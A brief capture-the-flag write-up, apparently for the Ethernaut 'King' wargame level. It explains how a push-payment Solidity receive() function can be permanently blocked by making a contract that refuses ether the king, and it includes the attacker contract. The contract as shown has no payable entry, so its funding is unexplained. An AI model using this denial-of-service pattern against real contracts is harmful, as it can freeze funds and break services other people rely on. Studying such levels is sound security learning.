Our goal in this level is to become the king and should make the level fail when it tries to reclaim ownership.

Let's analyze the function

```solidity
    receive() external payable {
            require(msg.value >= prize || msg.sender == owner);
            payable(king).transfer(msg.value);
            king = msg.sender;
            prize = msg.value;
    }
```

We can see that the level can always reclaim ownership even if have set the prize at something it can't afford, because of the `msg.sender == owner`.

Before setting the `king` to `msg.sender`, there is a transfer to the current king.
if this fails the level can't reclaim ownership as the function reverts.

So let's set the king to be the contract that has no payable to receive ether.

```solidity
    contract hackKing{
        function attackTheKing(address _target) public {
            (bool sent,) = payable(_target).call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }
```
